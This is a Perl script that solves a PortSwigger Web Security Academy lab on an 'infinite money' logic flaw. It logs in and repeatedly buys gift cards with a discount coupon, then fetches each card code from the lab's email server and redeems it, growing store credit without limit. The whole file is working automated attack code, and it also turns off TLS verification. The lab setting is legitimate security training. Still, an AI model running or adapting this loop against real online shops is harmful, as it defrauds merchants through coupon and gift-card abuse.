#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

# ugly and slow - but works

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Infinite money logic flaw", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $username,
    $password,
    $exploitEmailServerUrl,
    $coupon,
    $help,
);

$username = 'wiener';
$password = 'peter';
$coupon = 'SIGNUP30';

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'e|email=s'         => \$exploitEmailServerUrl,
    'h|help'            => \$help
);

pod2usage(1) if $help;
pod2usage(1) unless $url;
pod2usage(1) unless $exploitEmailServerUrl;

$url =~ s/\/$//;

our $ua = LWP::UserAgent->new(
    cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

our $csrfTokenPattern = '<input required type="hidden" name="csrf" value="(\w+)">';

$SIG{'INT'} = sub { say colored("[!] Happy shopping!", "magenta"); exit; };

say colored("[!] Ctrl + C to stop making money", "magenta");

# Login
&login();

while () {
    &checkCredit();
    &buyGiftCard();
}

sub getCsrfToken {
    my $content = shift;
    if ($content =~ /$csrfTokenPattern/ig) {
        return $1;
    } else {
        die colored("[!!] Couldn't obtain CSRF token, exiting..", "on_red");
    }
}

sub login {
    say colored("[*] Logging in...", "cyan");

    my ($response, $csrf);
    $response = $ua->get($url . '/login');
    die colored("[!!] Login failed: " . $response->status_line, "on_red") unless $response->is_success;
    $csrf = &getCsrfToken($response->decoded_content);

    $response = $ua->post(
        $url . '/login',
        {
            'csrf' => $csrf,
            'username' => $username,
            'password' => $password
        }
    );

    die colored("[!!] Login failed: " . $response->status_line . " | " . $response->decoded_content, "on_red") unless $response->status_line =~ /302 found/i;

    say colored("[+] Logged in as $username:$password", "green");
}

sub checkCredit {
    my $response = $ua->get($url . "/my-account");
    die colored("[!!] Getting /my-account failed: " . $response->status_line . ' | ' . $response->decoded_content, "on_red") unless $response->is_success;

    if ($response->decoded_content =~ /(Store credit: \$\d+\.\d{2})/ig) {
        say colored($1, "blue");
    } else {
        die colored("[!!] Checking credit failed, exiting..", "on_red");
    }
}

sub buyGiftCard {
    my ($response, $csrf);

    # Add to cart
    say colored("[*] Adding gift card to cart...", "cyan");

    $response = $ua->post(
        $url . '/cart',
        {
            'productId' => '2',
            'redir' => 'PRODUCT',
            'quantity' => '1'
        }
    );

    die colored("[!!] Adding gift card to cart failed: " . $response->status_line . " | " . $response->decoded_content, "on_red") unless $response->status_line =~ /302 found/i;

    # Add coupon
    say colored("[*] Applying coupon...", "cyan");

    $response = $ua->get($url . '/cart');
    die colored("[!!] Getting /cart failed: " . $response->status_line . ' | ' . $response->decoded_content, "on_red") unless $response->is_success;

    $csrf = &getCsrfToken($response->decoded_content);

    $response = $ua->post(
        $url . '/cart/coupon',
        {
            'csrf' => $csrf,
            'coupon' => $coupon
        }
    );

    die colored("[!!] Applying coupon failed: " . $response->status_line . " | " . $response->decoded_content, "on_red") unless $response->status_line =~ /302 found/i;

    # Buy gift card
    say colored("[*] Buying gift card...", "cyan");

    $response = $ua->get($url . '/cart');
    die colored("[!!] Getting /cart failed: " . $response->status_line . ' | ' . $response->decoded_content, "on_red") unless $response->is_success;

    $csrf = &getCsrfToken($response->decoded_content);

    $response = $ua->post(
        $url . '/cart/checkout',
        {
            'csrf' => $csrf
        }
    );

    die colored("[!!] Buying gift card failed: " . $response->status_line . " | " . $response->decoded_content, "on_red") if $response->decoded_content !~ /order-confirmation\?order-confirmed=true/i && $response->status_line !~ /303 see other/ig;

    # Get gift card code from mail
    say colored("[*] Getting code from email...", "cyan");
    my $giftCode;

    $response = $ua->get($exploitEmailServerUrl);
    if ($response->decoded_content =~ /Your gift card code is:\s+(\w+)\s+/ig) {
        $giftCode = $1;
    } else {
        die colored("[!!] Getting gift card code failed, exiting..", "on_red");
    }

    say colored("[+] Gift card code: $giftCode", "green");

    # Redeem code
    &redeemGiftCard($giftCode);
}

sub redeemGiftCard {
    my $code = shift;
    my ($response, $csrf);

    say colored("[*] Redeeming gift card...", "cyan");

    $response = $ua->get($url . "/my-account");
    die colored("[!!] Getting /my-account failed: " . $response->status_line . ' | ' . $response->decoded_content, "on_red") unless $response->is_success;

    $csrf = &getCsrfToken($response->decoded_content);

    $response = $ua->post(
        $url . '/gift-card',
        {
            'csrf' => $csrf,
            'gift-card' => $code
        }
    );

    die colored("[!!] Redeeming gift card failed: " . $response->status_line . " | " . $response->decoded_content, "on_red") unless $response->status_line =~ /302 found/i;

    say colored("[+] Gift card redeemed", "green");
}

__END__

=head1 SYNOPSIS

 $ perl infinite-money.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --email=<URL>              Exploit server email URL (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

=cut
